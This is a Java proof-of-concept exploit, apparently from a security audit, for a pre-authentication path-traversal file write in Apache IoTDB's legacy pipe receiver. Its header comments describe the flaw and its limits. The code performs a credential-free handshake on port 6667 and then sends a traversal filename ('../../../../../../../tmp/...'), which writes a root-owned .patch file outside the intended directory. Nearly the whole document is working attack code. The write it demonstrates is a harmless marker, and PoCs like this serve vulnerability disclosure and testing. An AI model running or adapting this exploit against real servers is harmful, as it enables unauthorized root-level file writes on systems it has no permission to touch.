import org.apache.iotdb.service.rpc.thrift.*;
import org.apache.iotdb.common.rpc.thrift.TSStatus;
import java.nio.ByteBuffer;

/**
 * F-02 — Pre-authentication arbitrary-DIRECTORY file write as root via the legacy pipe
 *        sendFile path (DataNode client RPC, port 6667).
 *
 * Chain (Apache IoTDB v2.0.10, commit 3c26382b):
 *   - IoTDBLegacyPipeReceiverAgent.handshake (:105-131) performs NO credential check — only a
 *     pipe-name format check (validatePipeName) — and runs subsequent work as SUPER_USER.
 *   - transportFile (:313,322) writes to `new File(fileDir, metaInfo.fileName + ".patch")` via
 *     RandomAccessFile(...,"rw") with NO validation of the client-supplied fileName against `..`.
 *   - ClientRPCServiceImpl.sendFile (:3417) delegates with no session gate.
 *
 * IMPORTANT scope (corrected after review): the receiver ALWAYS appends ".patch", so this is an
 * arbitrary-DIRECTORY write of a .patch-suffixed file (attacker chooses directory + filename prefix),
 * NOT control of the exact final filename and NOT a demonstrated overwrite of authorized_keys /
 * a JAR / a properties file. Rated High (arbitrary file write as root), not Critical RCE. Turning
 * it into RCE requires a separate file-consumption primitive, which this PoC does not demonstrate.
 *
 * Password-independent: the legacy handshake checks no credential, so rotating root's password
 * does not affect it.
 *
 * Usage: java F02_LegacyFileWrite <host> <6667> <traversal-fileName>
 */
public class F02_LegacyFileWrite {
  public static void main(String[] a) throws Exception {
    String host = a.length > 0 ? a[0] : "127.0.0.1";
    int port    = a.length > 1 ? Integer.parseInt(a[1]) : 6667;
    // 7 "../" from .../sync/receiver/<id>/file-data reaches "/", then /tmp/...
    String fileName = a.length > 2 ? a[2] : "../../../../../../../tmp/RAPTOR_F02_PROOF";

    System.out.println("[F-02] " + Common.ts() + "  target=" + host + ":" + port
        + "  (no openSession, no credentials)");
    IClientRPCService.Client c = Common.clientRpc(host, port);

    // Legacy handshake — only a pipe name, no credentials.
    TSyncIdentityInfo id = new TSyncIdentityInfo();
    id.setPipeName("validationpipe");
    id.setCreateTime(1L);
    id.setVersion("UNKNOWN");
    id.setDatabase("");
    TSStatus hs = c.handshake(id);
    System.out.println("[F-02] legacy handshake (no creds)    -> " + Common.code(hs));

    // sendFile with a traversing fileName.
    TSyncTransportMetaInfo meta = new TSyncTransportMetaInfo();
    meta.setFileName(fileName);
    meta.setStartIndex(0);
    byte[] payload = ("RAPTOR_LEGACY_PIPE_ARBITRARY_FILE_WRITE " + Common.ts() + "\n").getBytes("UTF-8");
    TSStatus st = c.sendFile(meta, ByteBuffer.wrap(payload));
    System.out.println("[F-02] sendFile fileName=" + fileName + " -> " + Common.code(st));
    System.out.println("[F-02] " + Common.ts()
        + "  If code=200, a root-owned <fileName>.patch was written OUTSIDE the sync receiver dir.");
  }
}
